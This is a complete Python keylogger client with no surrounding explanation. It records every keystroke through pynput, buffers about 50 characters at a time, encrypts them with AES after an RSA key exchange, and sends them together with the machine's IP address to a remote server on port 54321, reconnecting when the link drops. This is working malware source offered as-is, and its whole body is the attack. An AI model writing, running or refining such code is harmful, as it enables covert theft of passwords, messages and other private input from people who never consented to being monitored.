from pynput.keyboard import Key, Listener
from threading import Thread
import socket
from termcolor import colored
from time import sleep
from Crypto.Cipher import AES
import rsa

def on_press(key):
    global char_count, MAX_BUFFER_SIZE, is_server_connected, exit_program, buffer
    char_count += 1

    if key == Key.space:
        buffer += " "
        return
    
    elif key == Key.enter:
        buffer += "\n"
        return
    
    elif key == Key.backspace:
        buffer += "<BACKSPACE>"
        return
    
    elif key == Key.alt or key == Key.alt_l or key == Key.alt_r:
        buffer += "<ALT>"
        return
    
    elif key == Key.ctrl or key == Key.ctrl_l or key == Key.ctrl_r:
        buffer += "<CTRL>"
        return
    
    elif key == Key.up:
        buffer += "<UP>"
        return
    
    elif key == Key.down:
        buffer += "<DOWN>"
        return
    
    elif key == Key.left:
        buffer += "<LEFT>"
        return
    
    elif key == Key.right:
        buffer += "<RIGHT>"
        return
    
    elif key == Key.esc:
        buffer += "<ESC>"
        exit_program = True
        return
    
    elif key == Key.shift or key == Key.shift_l or key == Key.shift_r:
        return
    
    buffer += "{0}".format(key)[1:][:-1]

    if char_count >= MAX_BUFFER_SIZE and is_server_connected:
        Thread(target=send_message, args=(buffer,)).start()
    
def send_message(text : str | bytes):
    global s, char_count, is_server_connected, buffer
    
    if "str" in str(type(text)):
        text = text.encode()

    try:
        s.sendall( aes_encrypt(text) )
        # in case of errors, try to reconnect to the server
    except BrokenPipeError as bp:
        print(colored("[-] Connection closed", "red"))
        is_server_connected = False
        Thread(target=connect).start()
        return False

    except ConnectionResetError as cre:
        print(colored("[-] Connection closed by the server", "red"))
        is_server_connected = False
        Thread(target=connect).start()
        return False

    except Exception as e:
        print(e.with_traceback(None))
        return False

    # reset buffer count and empty file
    char_count = 0
    buffer = ""

    return True

def connect():
    global s, is_server_connected, exit_program
    exit_program = False
    HOST = ""
    PORT = 54321
    
    while True and not exit_program:
        try:
            s.connect( (HOST,PORT) )
            is_server_connected = True
            exchange_keys()
            return
        
        except ConnectionRefusedError as cre:
            print(colored("[-] Failed to connect to the server", "red"))
            if exit_program:
                return

        except Exception as e:
            print(e.with_traceback(None))
            if exit_program:
                return
        
        sleep(10)

    return

def exchange_keys():
    global server_key, s, RSA_KEY_LEN, aes_key
    
    public_key, private_key = rsa.newkeys(RSA_KEY_LEN)
    try:
        server_key = rsa.PublicKey.load_pkcs1( s.recv(RSA_KEY_LEN) )
    
    except:
        return False

    s.sendall( public_key.save_pkcs1() )
    aes_key = rsa.decrypt( s.recv(1024), private_key )

    send_message(s.getsockname()[0])
    return True
    
def aes_encrypt(message : str) -> bytes:
    global aes_key
    if "str" in str(type(message)):
        message = message.encode()
    iv = b"fw%Su!ap6#RppD(6"
    cipher = AES.new(aes_key, AES.MODE_CFB, iv)
    ciphertext = cipher.encrypt(message)
    return (iv + ciphertext)

def aes_decrypt(ciphertext : bytes) -> str:
    global aes_key
    if "str" in str(type(ciphertext)):
        ciphertext = ciphertext.encode()

    iv = ciphertext[:AES.block_size]
    cipher = AES.new(aes_key, AES.MODE_CFB, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:]).decode('utf-8', errors='ignore')
    return plaintext

def main():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    global is_server_connected, exit_program, char_count, buffer
    
    char_count = 0
    is_server_connected = False
    exit_program = False
    buffer = ""

    global MAX_BUFFER_SIZE, RSA_KEY_LEN
    RSA_KEY_LEN = 1024
    MAX_BUFFER_SIZE = 50

    thread_connect = Thread(target=connect)
    thread_connect.start()

    with Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == '__main__':
    main()
